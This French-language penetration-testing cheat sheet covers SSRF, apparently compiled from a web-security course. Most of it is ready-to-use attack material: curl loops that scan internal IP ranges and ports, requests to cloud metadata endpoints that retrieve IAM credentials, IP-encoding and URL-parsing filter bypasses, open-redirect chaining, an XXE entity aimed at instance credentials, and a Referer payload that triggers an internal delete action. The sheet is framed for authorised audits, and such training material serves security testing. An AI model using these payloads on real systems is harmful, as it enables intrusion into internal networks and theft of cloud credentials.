# SSRF (Server-Side Request Forgery) — Cheat Sheet

## 1. Périmètre et conventions

Cette fiche couvre la détection et l'exploitation des vulnérabilités SSRF (OWASP A10:2021), organisées autour de quatre questions pratiques : où chercher le point d'entrée, quelle cible atteindre, comment contourner un filtre, et comment confirmer un SSRF aveugle.

**Mécanisme central :** une fonctionnalité applicative qui effectue des requêtes réseau sortantes (récupération d'URL, webhook, prévisualisation de lien, import de flux, appel API tierce) est détournée pour cibler une ressource interne ou sensible — le serveur devient proxy involontaire de l'attaquant, héritant de ses relations de confiance avec le réseau interne.

**Familles de techniques couvertes :**

- **SSRF Loopback** : ciblage de `localhost`/`127.0.0.1` pour atteindre des interfaces d'administration locales.
- **SSRF Backend** : ciblage d'adresses IP privées (RFC 1918) pour atteindre des microservices internes.
- **Bypass de liste noire** : représentations alternatives d'IP, DNS contrôlé, encodage, casse.
- **Bypass de liste blanche** : ambiguïtés de parsing d'URL (`@`, `#`, sous-domaine inversé, double encodage).
- **Open Redirect chaining** : URL autorisée → redirection vers cible interne.
- **Blind SSRF (OAST)** : confirmation par callback DNS/HTTP quand la réponse n'est pas restituée.
- **Surface cachée** : URLs partielles, XXE comme vecteur SSRF, en-tête `Referer`.

**Outils :** Burp Suite (Repeater, Intruder, Collaborator), `curl`, `interactsh`, `ffuf`.

**Conditions générales :** techniques applicables uniquement sous autorisation écrite.

**Conventions des exemples :**

| Placeholder | Signification |
|---|---|
| `cible.com` | Nom d'hôte fictif de l'application vulnérable |
| `PARAM` | Nom du paramètre HTTP portant l'URL contrôlable |
| `192.168.X.X` | Adresse IP interne cible — à adapter à la plage observée |
| `unique-id.oastify.com` | Domaine OOB contrôlé par l'auditeur (Burp Collaborator / `interactsh`) |
| `evil-domain.attacker.com` | Domaine sous contrôle de l'auditeur avec enregistrement DNS arbitraire |

---

## 2. Tableau de repérage rapide

| Objectif | Technique ou syntaxe | Quand l'utiliser | Signal attendu | Limite principale |
|---|---|---|---|---|
| Détecter un point d'entrée SSRF | `url=http://unique-id.oastify.com/` | Tout paramètre acceptant une URL ou un nom d'hôte | Callback DNS + HTTP entrant sur le serveur OOB | Application async : le callback peut arriver avec délai |
| Atteindre l'interface admin locale | `url=http://localhost/admin` | Paramètre d'URL contrôlable, pas de filtre apparent | Contenu de l'interface admin dans la réponse | Filtre sur `localhost` → tenter les notations alternatives |
| Bypass de filtre sur `localhost` | `http://127.1/` ou `http://2130706433/` | Filtre bloquant `localhost` et `127.0.0.1` littéraux | Même comportement que `http://127.0.0.1/` | Un filtre peut bloquer plusieurs notations — tester chacune séparément |
| Bypass via DNS contrôlé | `http://evil-domain.attacker.com/` | Filtre sur IP mais pas sur noms de domaine | Requête atteignant `127.0.0.1` ou IP interne ciblée | L'application peut résoudre le DNS et filtrer l'IP résolue |
| Bypass de filtre de casse | `http://LOCALHOST/admin` | Filtre insensible à la casse absent | Comportement identique à `localhost` | Inefficace si le filtre normalise la casse avant comparaison |
| Bypass via encodage URL | `http://127%2e0%2e0%2e1/admin` | Filtre appliqué sur chaîne brute sans décodage | Traversée du filtre, connexion effective à `127.0.0.1` | Inefficace si le filtre décode avant de comparer |
| Bypass de liste blanche via `@` | `https://expected-host@evil-host.com/` | Liste blanche vérifiant la présence de l'hôte autorisé en début de chaîne | Connexion effective vers `evil-host.com` | Filtre structurel analysant le hostname extrait = non bypassable |
| Bypass de liste blanche via `#` | `https://evil-host.com#expected-host.com` | Liste blanche vérifiant la présence de l'hôte autorisé n'importe où dans la chaîne | Connexion vers `evil-host.com`, fragment ignoré par le client HTTP | Filtre extrayant le hostname avant le `#` = non bypassable |
| Bypass via Open Redirect | `url=https://trusted-host.com/redirect?to=http://192.168.0.68/admin` | Liste blanche passée, client HTTP suivant les redirections | Accès à l'IP interne après redirection | Client HTTP configuré pour ne pas suivre les redirections = non bypassable |
| Cartographier le réseau interne | Itérer sur `http://192.168.0.{1..254}/` | SSRF confirmé, cibles internes inconnues | Différence de temps de réponse ou de code HTTP entre IPs actives et inactives | Aveugle : nécessite une mesure comparative, pas une lecture directe |
| Confirmer un Blind SSRF | `url=http://unique-id.oastify.com/` | Aucune réponse restituée dans l'interface | Interaction DNS / HTTP entrante sur le serveur OOB | Résolution DNS seule = validation de domaine possible, pas forcément connexion HTTP complète |

---

## 3. Techniques classées par objectif

### 3.1 Détecter — Identifier les points d'entrée

**Objectif :** cartographier les fonctionnalités qui effectuent des requêtes sortantes et acceptent tout ou partie d'une URL comme entrée utilisateur.

**Quand l'utiliser :** en début d'audit, lors de la revue de la surface d'attaque.

**Paramètres et fonctionnalités à inspecter en priorité :**

```text
Paramètres nommés (non exhaustif) :
  url=       fetch=     api=       endpoint=
  webhook=   source=    preview=   import=
  proxy=     target=    link=      callback=
  path=      host=      domain=    subdomain=

Fonctionnalités à surveiller :
  — Récupération et prévisualisation d'image ou de lien à partir d'une URL
  — Webhooks, notifications de paiement, callbacks tiers
  — Import/export de fichiers depuis une URL distante
  — Appels vers des API tierces dont l'URL est paramétrée
  — Parseurs XML (XXE) et documents bureautiques acceptant des entités externes
  — Scripts analytics côté serveur consommant l'en-tête Referer
```

**Sonde OAST minimale :**

```bash
curl -X POST https://cible.com/fetch-preview \
  -d "PARAM=http://unique-id.oastify.com/"
```

**Signal attendu :** interaction entrante (DNS + HTTP) sur le serveur OOB — confirme l'émission effective d'une requête sortante par le serveur.

**Interprétation :** une résolution DNS seule (sans requête HTTP associée) peut indiquer une validation de domaine côté serveur sans connexion complète — signal plus faible, mais confirme un point d'entrée à approfondir.

**Source :** cours fourni, sections 1.1, 5.3 et 6.

---

### 3.2 Exploiter — SSRF Loopback (interface locale)

**Objectif :** atteindre une interface d'administration ou un service écoutant localement, inaccessible depuis l'extérieur.

**Quand l'utiliser :** paramètre d'URL identifié, pas de filtre apparent ou filtre contournable (voir section 3.4).

**Prérequis :** le service cible doit écouter localement (port non exposé en externe) et ne pas réauthentifier les requêtes provenant de `127.0.0.1`.

**Syntaxe minimale :**

```bash
curl -X POST https://cible.com/product/stock \
  -d "stockApi=http://localhost/admin"

# Variante explicite
curl -X POST https://cible.com/product/stock \
  -d "stockApi=http://127.0.0.1/admin"
```

**Requête HTTP Burp Repeater :**

```http
POST /product/stock HTTP/1.1
Host: cible.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

**Signal attendu :** contenu de l'interface d'administration dans le corps de la réponse HTTP.

**Interprétation :** l'accès sans authentification confirme que le service fait confiance implicitement à l'origine réseau locale. Ne pas conclure à un impact maximum avant d'avoir identifié les actions disponibles sur l'interface atteinte.

**Limites :** si le service local authentifie ses appelants indépendamment de leur origine réseau (zero-trust), l'accès sera refusé même via loopback.

**Source :** cours fourni, sections 2.2 et 2.3.

---

### 3.3 Exploiter — SSRF Backend (réseau interne)

**Objectif :** atteindre des machines situées dans le réseau interne de l'organisation (microservices, API internes, panneaux d'administration cachés).

**Quand l'utiliser :** SSRF loopback non concluant ou voulu, réseau interne à cartographier.

**Plages d'adresses à cibler en priorité :**

```text
10.0.0.0/8           — Réseau privé classe A
172.16.0.0/12        — Réseau privé classe B
192.168.0.0/16       — Réseau privé classe C
169.254.169.254      — Métadonnées d'instance cloud (AWS IMDSv1, GCP, Azure)
```

**Syntaxe minimale :**

```bash
curl -X POST https://cible.com/fetch-preview \
  -d "url=http://192.168.0.68/admin"
```

**Scan de la plage interne (à automatiser) :**

```bash
for ip in 192.168.0.{1..254}; do
  curl -s -o /dev/null -w "%{http_code} %{time_total} $ip\n" \
    -X POST https://cible.com/fetch-preview -d "url=http://$ip/"
done
```

**Métadonnées cloud (IMDS AWS IMDSv1) :**

```bash
curl -X POST https://cible.com/fetch-preview \
  -d "url=http://169.254.169.254/latest/meta-data/"

# Exfiltration de credentials IAM (si endpoint de rôle lisible)
curl -X POST https://cible.com/fetch-preview \
  -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Signal attendu :** différence de temps de réponse ou de code HTTP entre IPs actives et inactives (scan aveugle) ; ou contenu du service interne directement dans la réponse.

**Source :** cours fourni, sections 3.2 et 3.3.

---

### 3.4 Contourner — Bypass de liste noire

**Objectif :** franchir un filtre bloquant `localhost` et `127.0.0.1` sous leur forme littérale.

**Règle :** tester une notation à la fois, en conservant le même chemin cible pour comparer les résultats.

**Notations alternatives de `127.0.0.1` :**

| Notation | Valeur | Mécanisme |
|---|---|---|
| Décimale 32 bits | `http://2130706433/` | Entier décimal équivalent à `127.0.0.1` |
| Octale | `http://017700000001/` | Préfixe `0` = interprétation octale par la pile réseau |
| Abrégée | `http://127.1/` | Octets manquants complétés automatiquement par l'OS |
| Hexadécimale | `http://0x7f000001/` | `0x7f` = 127, `0x000001` = 0.0.1 |

**Encodage URL des séparateurs :**

```text
http://127%2e0%2e0%2e1/admin      ← séparateurs encodés
http://LOCALHOST/admin             ← casse alternative
http://LoCaLhOsT/admin            ← mixte
```

**DNS contrôlé pointant vers `127.0.0.1` :**

```text
# Enregistrement DNS à créer :
evil-domain.attacker.com.  IN  A  127.0.0.1

# Payload :
url=http://evil-domain.attacker.com/admin
```

**DNS Rebinding (avancé) :**

```text
1. Enregistrement DNS initial : evil-domain.attacker.com → IP publique inoffensive
   (passe la validation si le filtre résout le DNS une seule fois)
2. TTL très court (1 s)
3. Après validation : modifier l'enregistrement pour pointer vers 127.0.0.1 ou IP interne
4. Lors de la connexion effective : le serveur résout à nouveau → obtient l'IP interne
```

**Signal attendu :** comportement identique à une requête vers `127.0.0.1` directe.

**Limites :** un filtre qui résout le DNS et compare l'IP résolue aux plages bloquées neutralise les notations alternatives et le DNS contrôlé, mais reste vulnérable au DNS rebinding si la résolution n'est pas fixée pour la durée de la connexion.

**Source :** cours fourni, section 4.A.

---

### 3.5 Contourner — Bypass de liste blanche

**Objectif :** tromper un filtre validant que l'URL appartient à un hôte autorisé, en exploitant des ambiguïtés de parsing entre le validateur et le client HTTP.

**Règle :** tester un bypass à la fois, en conservant la même cible interne.

#### Bypass via `@` (identifiants intégrés)

```text
https://expected-host.com:motdepasse@evil-host.com/admin
```

Le filtre voit `expected-host.com` en début de chaîne → passe. Le client HTTP se connecte à `evil-host.com` (tout ce qui précède `@` est traité comme identifiants, pas comme hôte).

#### Bypass via `#` (fragment)

```text
https://evil-host.com#expected-host.com
```

Le filtre trouve `expected-host.com` dans la chaîne → passe. Le client HTTP ignore tout ce qui suit `#` → se connecte uniquement à `evil-host.com`.

#### Bypass via sous-domaine inversé

```text
https://expected-host.com.evil-host.com/admin
```

Le filtre trouve la sous-chaîne `expected-host.com` → passe. La résolution DNS effective porte sur `expected-host.com.evil-host.com` = sous-domaine de `evil-host.com`, intégralement sous contrôle de l'attaquant.

#### Bypass via double encodage

```text
http://169.254.169.254/%25....latest/meta-data/
```

Le filtre décode une fois et ne reconnaît pas le motif. L'application décode une seconde fois → chemin réel atteint.

**Signal attendu :** connexion effective vers l'hôte cible malgré la présence de l'hôte autorisé dans la chaîne.

**Limites :** un parser structurel qui extrait le hostname canonique avant toute comparaison neutralise l'ensemble de ces bypasses.

**Source :** cours fourni, section 4.B.

---

### 3.6 Contourner — Open Redirect chaining

**Objectif :** exploiter une redirection ouverte sur un hôte de la liste blanche pour atteindre une ressource interne hors périmètre de validation.

**Quand l'utiliser :** liste blanche présente, URL initiale validée ; client HTTP côté serveur suivant les redirections automatiquement (comportement par défaut de la plupart des bibliothèques HTTP).

**Syntaxe minimale :**

```http
POST /fetch HTTP/1.1
Host: cible.com
Content-Type: application/x-www-form-urlencoded

url=https://trusted-host.com/product/nextProduct?path=http://192.168.0.68/admin
```

**Mécanisme :**

```text
1. Filtre valide l'URL initiale : trusted-host.com ✓ (liste blanche)
2. Le serveur appelle trusted-host.com/redirect?path=http://192.168.0.68/admin
3. trusted-host.com répond HTTP 302 → Location: http://192.168.0.68/admin
4. Le client HTTP suit automatiquement la redirection → connexion à 192.168.0.68
   (aucune revalidation de la nouvelle destination)
```

**Signal attendu :** contenu du service interne à `192.168.0.68` dans la réponse finale.

**Limites :** inefficace si le client HTTP côté serveur est configuré avec `allow_redirects=False`, ou si chaque URL intermédiaire est revalidée.

**Source :** cours fourni, sections 4.A et 4.C.

---

### 3.7 Confirmer — Blind SSRF (OAST)

**Objectif :** prouver l'émission d'une requête sortante quand aucune réponse n'est restituée dans l'interface.

**Quand l'utiliser :** fonctionnalité susceptible d'émettre des requêtes, mais sans retour visible dans la réponse HTTP.

**Prérequis :** accès à un serveur OOB (Burp Collaborator, `interactsh`).

**Syntaxe minimale :**

```bash
curl -X POST https://cible.com/fetch-preview \
  -d "url=http://unique-id.oastify.com/"
```

**Sur tous les paramètres suspects — y compris l'en-tête `Referer` :**

```http
GET /product?id=42 HTTP/1.1
Host: cible.com
Referer: http://unique-id.oastify.com/
```

**Interprétation des interactions OOB reçues :**

| Interaction reçue | Ce qu'elle prouve |
|---|---|
| Requête DNS uniquement | Résolution DNS effectuée — validation de domaine probable côté serveur ; connexion HTTP non établie |
| Requête DNS + requête HTTP GET | Connexion TCP et HTTP complète — émission effective de la requête SSRF confirmée |
| Aucune interaction | Requêtes sortantes bloquées, domaine filtré, ou traitement asynchrone avec délai — ne pas conclure à l'absence de SSRF |

**Signal attendu :** interaction HTTP entrante depuis l'IP du serveur cible (et non depuis le poste de l'auditeur ou un navigateur).

**Limites :** un traitement asynchrone peut retarder significativement le callback — attendre plusieurs minutes avant de conclure à l'absence de signal.

**Source :** cours fourni, section 5.3.

---

### 3.8 Détecter — Surface d'attaque cachée

#### URLs partielles (fragment contrôlable)

**Quand l'utiliser :** le paramètre ne contient qu'un sous-domaine, un chemin ou un identifiant, concaténé côté serveur à une structure fixe.

```text
# Paramètre exposé : subdomain=stock.weliketoshop.net
# Reconstruction côté serveur : http:// + subdomain + /check?productId=6

# Injection via le fragment contrôlé :
subdomain=evil-host.com%23   ← le # tronque la suite de l'URL côté serveur
subdomain=@evil-host.com     ← l'@ détourne l'hôte de connexion effective
```

**Source :** cours fourni, section 6.1.

#### XXE comme vecteur SSRF

**Quand l'utiliser :** endpoint acceptant du XML, des fichiers SVG ou des documents bureautiques (`.docx`, `.xlsx`) avec résolution d'entités externes activée.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```

**Signal attendu :** contenu de l'URL interne reflété dans la réponse (souvent dans un message d'erreur ou un champ de résultat du document parsé).

**Source :** cours fourni, section 6.2.

#### En-tête `Referer` consommé par un script analytics

**Quand l'utiliser :** l'application comporte un mécanisme d'analyse d'audience qui suit automatiquement les URLs du `Referer`.

```http
GET /product?id=42 HTTP/1.1
Host: cible.com
Referer: http://192.168.0.68/admin/delete-user?id=1
```

**Signal attendu :** action effectuée sur le service interne (comportement de l'application modifié, callback OOB reçu).

**Limites :** le traitement analytics est souvent asynchrone — le signal peut être différé.

**Source :** cours fourni, section 6.3.

---

## 4. Payloads et syntaxes représentatifs

| Intention | Payload de référence | Contexte d'insertion | Variante utile | Différence apportée |
|---|---|---|---|---|
| Confirmation OAST | `http://unique-id.oastify.com/` | Paramètre acceptant une URL | Tester aussi sur `Referer` | Couvre la surface cachée analytics |
| SSRF Loopback | `http://localhost/admin` | Paramètre d'URL libre | `http://127.0.0.1/admin` | Notation alternative — à tester si `localhost` est filtré |
| Bypass décimal | `http://2130706433/admin` | Paramètre d'URL | `http://0x7f000001/admin` | Notation hexadécimale — même résultat |
| Bypass octal | `http://017700000001/admin` | Paramètre d'URL | `http://127.1/admin` | Notation abrégée — testée séparément |
| Bypass encodage | `http://127%2e0%2e0%2e1/admin` | Paramètre d'URL (GET ou POST) | `http://LOCALHOST/admin` | Encodage des séparateurs vs variation de casse |
| Bypass DNS contrôlé | `http://evil-domain.attacker.com/admin` | Paramètre d'URL | — | Nécessite un enregistrement A pointant vers l'IP cible |
| Bypass `@` (whitelist) | `https://expected-host@evil-host.com/admin` | Paramètre d'URL validé par whitelist | — | Identifiants d'URL détournant l'hôte de connexion |
| Bypass `#` (whitelist) | `https://evil-host.com#expected-host.com` | Paramètre d'URL validé par whitelist | — | Fragment ignoré par le client HTTP |
| Bypass sous-domaine | `https://expected-host.com.evil-host.com/` | Paramètre d'URL validé par whitelist | — | Sous-domaine de `evil-host.com` sous contrôle de l'attaquant |
| Open Redirect chain | `https://trusted-host.com/redirect?to=http://192.168.0.68/admin` | Paramètre d'URL avec whitelist | — | La redirection n'est pas revalidée par le filtre initial |
| Cloud IMDS (AWS) | `http://169.254.169.254/latest/meta-data/` | Paramètre d'URL | `/latest/meta-data/iam/security-credentials/` | Exfiltration des credentials IAM en une requête supplémentaire |
| XXE SSRF | `<!ENTITY xxe SYSTEM "http://169.254.169.254/...">` | Corps XML d'une requête acceptant des entités externes | — | Vecteur indirect : pas de paramètre d'URL explicite |

---

## 5. Encodages, formats et représentation des entrées

| Représentation d'origine | Représentation alternative | Contexte pertinent | Composant décodant | Effet attendu |
|---|---|---|---|---|
| `127.0.0.1` | `2130706433` (décimal) | Paramètre d'URL numérique | Pile réseau OS | Contourne un filtre texte sur `127.0.0.1` littéral |
| `127.0.0.1` | `017700000001` (octal) | Paramètre d'URL | Pile réseau OS | Contourne un filtre sur la notation décimale |
| `127.0.0.1` | `127.1` (abrégé) | Paramètre d'URL | Pile réseau OS | Contourne un filtre cherchant 4 octets |
| `127.0.0.1` | `0x7f000001` (hex) | Paramètre d'URL | Pile réseau OS | Contourne un filtre non hexadécimal |
| `.` (point) | `%2e` | URL dans paramètre GET/POST | Serveur web / client HTTP | Contourne un filtre cherchant `.` brut dans le nom d'hôte |
| `localhost` | `LOCALHOST`, `LoCaLhOsT` | Paramètre d'URL | Client HTTP, pas le filtre | Contourne un filtre sensible à la casse |
| `/` (chemin) | `%2f` | Chemin dans une URL validée | Serveur web | Contourne un filtre cherchant `/` brut |
| `@` (séparateur identifiants) | `%40` | URL dans paramètre GET | Client HTTP (décode avant parsing) | Contourne un filtre ne décodant pas avant de parser l'URL |
| Double encodage `%2e` | `%252e` | Paramètre d'URL avec WAF en amont | WAF (1er décodage) + applicatif (2e décodage) | WAF voit `%252e`, appli reçoit `%2e` → décode en `.` |

**Condition d'inefficacité générale :** tous ces encodages sont sans effet si le filtre normalise complètement l'URL (décode intégralement + résout le nom d'hôte canonique) avant d'appliquer ses règles de comparaison.

---

## 6. Exemples de requêtes HTTP

### 6.1 SSRF Loopback basique

```http
# Référence — requête légitime
POST /product/stock HTTP/1.1
Host: cible.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.cible.com:8080/check?productId=6&storeId=1
```

```http
# Version modifiée — ciblage de l'interface admin locale
POST /product/stock HTTP/1.1
Host: cible.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

- **Changement clé :** URL entière remplacée par `http://localhost/admin`.
- **Signal recherché :** contenu de l'interface d'administration dans le corps de la réponse.
- **Ce que cela ne prouve pas seul :** que l'interface est exploitable — lire le contenu pour identifier les actions disponibles avant d'aller plus loin.

### 6.2 Bypass de liste noire — notation décimale

```http
# Payload avec notation décimale 32 bits
POST /fetch HTTP/1.1
Host: cible.com
Content-Type: application/x-www-form-urlencoded

url=http://2130706433/admin
```

- **Changement clé :** `127.0.0.1` → `2130706433` (valeur entière 32 bits).
- **Pourquoi important :** la pile réseau de l'OS résout `2130706433` en `127.0.0.1` — le filtre ne l'a pas reconnu.
- **Ce que cela ne prouve pas seul :** que d'autres notations fonctionnent aussi — tester chaque notation séparément.

### 6.3 Bypass de liste blanche — caractère `@`

```http
POST /fetch HTTP/1.1
Host: cible.com
Content-Type: application/x-www-form-urlencoded

url=https://expected-host.com:motdepasse@evil-host.com/admin
```

- **Changement clé :** `expected-host.com:motdepasse@` ajouté comme préfixe d'identifiants.
- **Signal recherché :** connexion effective vers `evil-host.com` malgré la présence de `expected-host.com` dans l'URL.
- **Ce que cela ne prouve pas seul :** que tous les parseurs d'URL se comportent de la même façon — certains extraient l'hôte correctement.

### 6.4 Open Redirect chaining

```http
POST /fetch HTTP/1.1
Host: cible.com
Content-Type: application/x-www-form-urlencoded

url=https://trusted-host.com/product/nextProduct?path=http://192.168.0.68/admin
```

- **Changement clé :** l'URL initiale pointe vers un hôte autorisé qui redirige vers la cible interne.
- **Prérequis :** `trusted-host.com` dispose d'un Open Redirect exploitable ; le client HTTP côté serveur suit les redirections.
- **Ce que cela ne prouve pas seul :** que la redirection sera suivie — vérifier le comportement du client HTTP (présence d'un `Location` dans les réponses intermédiaires si observable).

### 6.5 Blind SSRF — OAST via `Referer`

```http
GET /product?id=42 HTTP/1.1
Host: cible.com
Referer: http://unique-id.oastify.com/tracking
```

- **Changement clé :** `Referer` pointant vers le domaine OOB.
- **Prérequis :** composant analytics côté serveur consommant automatiquement le `Referer`.
- **Signal recherché :** interaction DNS + HTTP entrante sur le serveur OOB — confirme un SSRF aveugle via cette surface cachée.

---

## 7. Outils et commandes

| Outil | Fonction | Quand l'utiliser | Exemple minimal | Limite ou précaution |
|---|---|---|---|---|
| Burp Repeater | Modification manuelle et renvoi de requêtes | Exploration initiale, test de chaque bypass un par un | Modifier le paramètre d'URL, observer la réponse | Pas adapté au balayage de plages IP — passer à Intruder ou ffuf |
| Burp Intruder (Sniper) | Itération automatique sur une position variable | Scan de plage IP interne, test des notations alternatives | Position sur l'IP/l'octet variable, liste de valeurs | Bruyant dans les logs ; respecter le rate-limiting de la cible |
| Burp Collaborator | Serveur OOB DNS/HTTP | Détection OAST, confirmation Blind SSRF | Générer un domaine unique, l'insérer dans le paramètre | Nécessite Burp Pro ; les interactions asynchrones peuvent arriver avec délai |
| `interactsh` | Alternative open-source à Collaborator | Idem, sans Burp Pro | `interactsh-client` → domaine unique → insérer dans le payload | Accès réseau sortant depuis le serveur cible vers le domaine OOB requis |
| `curl` | Requêtes HTTP ponctuelles, scripts de scan | Confirmation rapide d'un payload, balayage de plage IP | `curl -X POST cible.com/fetch -d "url=http://192.168.0.X/"` | Pas de gestion native des sessions ni des cookies complexes |
| `ffuf` | Fuzzing de paramètres et de valeurs | Balayage de plage IP interne, test automatisé de notations | `ffuf -u "https://cible.com/fetch?url=http://192.168.0.FUZZ/" -w ips.txt` | Dépend de la capacité à distinguer les réponses (taille, code, temps) |

---

## 8. Signaux caractéristiques et vérifications

| Observation | Ce qu'elle peut indiquer | Vérification complémentaire | Conclusion à éviter |
|---|---|---|---|
| Contenu d'une interface admin dans la réponse | SSRF loopback ou backend exploité avec succès | Identifier les actions disponibles et les exécuter sur un compte de test | Que l'interface est non authentifiée — peut nécessiter un token ou un cookie obtenu par une autre faille |
| Code HTTP différent selon l'IP ciblée (200 vs timeout) | IP interne active détectée | Tester des ports spécifiques sur l'IP active (`/admin`, `:8080`, `:9200`) | Qu'un timeout prouve l'inexistence du service — peut être un filtrage réseau |
| Requête DNS entrante sur le serveur OOB | SSRF aveugle confirmé — émission d'une résolution DNS au minimum | Vérifier si une requête HTTP accompagne le DNS — sinon, signal plus faible (validation de domaine seule) | Qu'une résolution DNS seule constitue un SSRF complet — nécessite une interaction HTTP pour en être certain |
| Requête HTTP entrante sur le serveur OOB | Blind SSRF complet confirmé — connexion TCP et HTTP établie | Vérifier l'IP source de l'interaction (doit être celle du serveur, pas du navigateur de l'auditeur) | Que tout le réseau interne est atteignable — le firewall interne peut restreindre la destination |
| Pas d'interaction OOB après un délai raisonnable | Requêtes sortantes bloquées, ou traitement asynchrone avec long délai | Attendre plusieurs minutes ; tester un autre paramètre ou vecteur (Referer, XXE) | Que l'absence de signal OOB immédiat prouve l'absence de SSRF |
| Réponse identique quelle que soit l'IP injectée | Filtre présent ou requête non émise | Tester les notations alternatives et les bypasses de section 3.4 et 3.5 | Que l'application n'est pas vulnérable au SSRF — peut indiquer uniquement que ce vecteur précis est bloqué |

---

## 9. Variantes de syntaxe et adaptation

#### Choisir le bypass selon le signal du filtre

| Signal observé | Hypothèse de filtre | Bypass à tester |
|---|---|---|
| Blocage de `localhost` et `127.0.0.1` littéraux | Liste noire sur les chaînes brutes | Notations alternatives (décimal, octal, hex, abrégé) |
| Blocage des notations alternatives — IP résolue filtrée | Résolution DNS + vérification de plage IP | DNS contrôlé pointant vers l'IP cible + DNS Rebinding |
| Blocage de toute IP privée mais URL libre | Comparaison de sous-chaîne sur la liste blanche | Bypass `@`, `#`, sous-domaine inversé |
| Hôte autorisé obligatoire, redirections suivies | Liste blanche correcte mais redirections non revalidées | Open Redirect chaining |
| Aucun paramètre d'URL visible | Surface cachée | XXE, en-tête `Referer`, URLs partielles |

**Règle :** ne tester qu'un seul bypass à la fois. Changer simultanément la notation et le chemin cible rend le résultat ininterprétable.

#### Adapter la profondeur du scan interne

**Problème précis :** l'IP interne atteinte ne répond sur aucune route connue.

**Ce qui change :** le port et le chemin, pas la technique.

```bash
# Tester les ports courants des services internes
for port in 22 80 443 8080 8443 9200 6379 27017 5432; do
  curl -s -o /dev/null -w "%{http_code} $port\n" \
    -X POST https://cible.com/fetch -d "url=http://192.168.0.68:$port/"
done
```

---

## 10. Diagnostic rapide des erreurs

| Problème constaté | Causes possibles | Vérification à effectuer | Ajustement pertinent | Ce que cela permet de conclure |
|---|---|---|---|---|
| Réponse identique quelle que soit l'URL injectée | Paramètre non transmis à la fonction de requête, ou filtre bloquant silencieusement | Tester d'abord une URL externe valide et observable (ex. un serveur HTTP sous contrôle) pour confirmer que la fonction émet des requêtes | Vérifier si d'autres paramètres de la même requête contrôlent l'URL | Que ce paramètre précis n'est peut-être pas le vecteur — pas que l'application est exempte de SSRF |
| Erreur réseau ou timeout sur loopback | Port local non ouvert, ou service interne écoutant sur un port non standard | Tester d'autres ports (`/admin:8080`, `:8443`) | Scanner les ports courants sur `127.0.0.1` via Intruder | Que le service existe mais écoute sur un port différent |
| Bypass de liste noire échoue sur toutes les notations | Filtre résolvant le DNS et filtrant l'IP résolue | Tester un domaine DNS contrôlé pointant vers une IP publique (si interne bloquée, confirme la vérification d'IP) | Passer au DNS Rebinding ou chercher un vecteur indirect (Open Redirect, XXE) | Que la liste noire est plus robuste — pas qu'elle est infranchissable |
| Bypass `@` sans effet | Parser structurel extrayant l'hostname correctement | Tester le bypass `#` ou sous-domaine | — | Que ce parseur implémente correctement la RFC 3986 pour ce caractère |
| Callback OOB DNS mais pas HTTP | Validation de domaine côté serveur (résolution sans connexion HTTP) | Tester avec un domaine Collaborator qui répond sur HTTP (confirmera si la connexion TCP est tentée) | Passer au DNS Rebinding pour contourner la validation DNS | Que le serveur ne fait qu'une validation DNS sans établir de connexion — signal plus faible mais non sans intérêt |
| Aucun callback OOB après plusieurs minutes | Requêtes sortantes DNS et HTTP bloquées par le firewall réseau | Tester un vecteur indirect (XXE, Referer) ou vérifier l'accès sortant sur d'autres ports | Vérifier si un proxy HTTP interne est utilisé pour les requêtes sortantes (changer le protocole ou le port) | Que le firewall bloque la sortie directe — pas que le code est exempt de SSRF |

---

## 11. Checklist d'utilisation

- [ ] Tous les paramètres acceptant une URL (totale ou partielle) sont identifiés, y compris les vecteurs cachés (XXE, `Referer`, URLs partielles).
- [ ] La sonde OAST initiale est envoyée avant tout test de payload interne.
- [ ] Le signal OAST (DNS seul vs DNS + HTTP) est documenté et interprété correctement.
- [ ] Les notations alternatives d'IP sont testées une par une en conservant le même chemin cible.
- [ ] Un seul bypass est testé à la fois pour pouvoir attribuer le succès ou l'échec à la technique précise.
- [ ] La plage d'IP interne est scannée méthodiquement (Intruder ou ffuf) après confirmation d'un SSRF fonctionnel.
- [ ] Les ports courants des services internes sont testés sur chaque IP active identifiée.
- [ ] L'absence de signal OOB immédiat n'est pas conclue comme absence de vulnérabilité sans attente suffisante et test de vecteurs alternatifs.
- [ ] L'impact réel est documenté au niveau de l'action effectuée (interface atteinte, credential exfiltré, action déclenchée), pas seulement au niveau de la connexion établie.
- [ ] Les tests sur des environnements de production évitent les actions destructrices (ex. ne pas déclencher de `delete-user` sur un service admin interne).

---

## 12. Sources et liens de référence

- [PortSwigger Web Security Academy — SSRF](https://portswigger.net/web-security/ssrf)
- [OWASP Top 10 — A10:2021 Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MITRE CWE-918 — Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [ProjectDiscovery interactsh — alternative open-source à Burp Collaborator](https://github.com/projectdiscovery/interactsh)
- Voir aussi : fiche complémentaire `cheatsheet-lfi-rfi-upload.md` pour l'exploitation XXE complète via documents uploadés (vecteur SSRF indirect, section 6.2 du cours).
